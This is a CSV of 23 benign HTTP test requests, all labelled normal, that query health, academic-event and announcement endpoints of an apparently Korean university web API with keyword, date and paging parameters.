case_id,case_class,request_intent,http_method,request_path,content_type,request_body,auth_scope,capture_var,capture_expr,accepted_codes
public_001,normal,public-normal,GET,/api/health,,,none,,,200|404
public_002,normal,public-normal,GET,/api/public/academic-events,,,none,,,200|404
public_003,normal,public-normal,GET,/api/public/announcements?sort=latest&page=0&size=10,,,none,,,200|404
public_004,normal,public-normal,GET,/api/public/announcements?sort=title&page=0&size=10,,,none,,,200|404
public_005,normal,public-normal,GET,/api/public/announcements?sort=oldest&page=0&size=10,,,none,,,200|404
public_006,normal,public-normal,GET,/api/public/announcements?keyword=%EB%8F%84%EC%84%9C%EA%B4%80&sort=latest&page=0&size=10,,,none,,,200|404
public_007,normal,public-normal,GET,/api/public/announcements?keyword=%EB%B3%B4%EC%95%88%EA%B3%BC%EB%AA%A9%20%EA%B3%BC%EC%A0%9C&sort=title&page=0&size=10,,,none,,,200|404
public_008,normal,public-normal,GET,/api/public/announcements?keyword=%EC%9B%B9%EB%B3%B4%EC%95%88%20%EC%8B%A4%EC%8A%B5&sort=latest&page=0&size=10,,,none,,,200|404
public_009,normal,public-normal,GET,/api/public/announcements?keyword=%EC%BA%A0%ED%8D%BC%EC%8A%A4%20%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC&sort=latest&page=0&size=10,,,none,,,200|404
public_010,normal,public-normal,GET,/api/public/announcements?keyword=%EA%B0%9C%EA%B0%95%20%EC%95%88%EB%82%B4&sort=latest&page=0&size=10,,,none,,,200|404
public_011,normal,public-normal,GET,/api/public/announcements?keyword=%EC%88%98%EA%B0%95%EC%A0%95%EC%A0%95&sort=title&page=0&size=10,,,none,,,200|404
public_012,normal,public-normal,GET,/api/public/announcements?dateFrom=2026-03-01&dateTo=2026-03-31&sort=latest&page=0&size=10,,,none,,,200|404
public_013,normal,public-normal,GET,/api/public/announcements?keyword=%EC%A0%90%EA%B2%80&dateFrom=2026-01-01&dateTo=2026-12-31&sort=title&page=0&size=10,,,none,,,200|404
public_014,normal,public-normal,GET,/api/public/announcements/1,,,none,,,200|404
public_015,normal,public-normal,GET,/api/public/announcements/2,,,none,,,200|404
public_016,normal,public-normal,GET,/api/public/announcements/999999,,,none,,,200|404
public_017,normal,public-normal,GET,/api/public/announcements?keyword=%EB%8F%84%EC%84%9C%EA%B4%80%20%EC%9A%B4%EC%98%81%EC%8B%9C%EA%B0%84&sort=latest&page=1&size=5,,,none,,,200|404
public_018,normal,public-normal,GET,/api/public/announcements?keyword=%EC%9E%A5%ED%95%99%EA%B8%88&sort=title&page=0&size=5,,,none,,,200|404
public_019,normal,public-normal,GET,/api/public/announcements?keyword=%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC%20%EC%A0%90%EA%B2%80&sort=latest&page=0&size=5,,,none,,,200|404
public_020,normal,public-normal,GET,/api/public/announcements?keyword=%EC%A7%80%EC%9B%90%EC%84%BC%ED%84%B0&sort=latest&page=0&size=5,,,none,,,200|404
public_021,normal,public-normal,GET,/api/public/academic-events,,,none,,,200|404
public_022,normal,public-normal,GET,/api/health,,,none,,,200|404
public_023,normal,public-normal,GET,/api/public/announcements?keyword=%EA%B0%9C%EA%B0%95&sort=latest&page=0&size=5,,,none,,,200|404
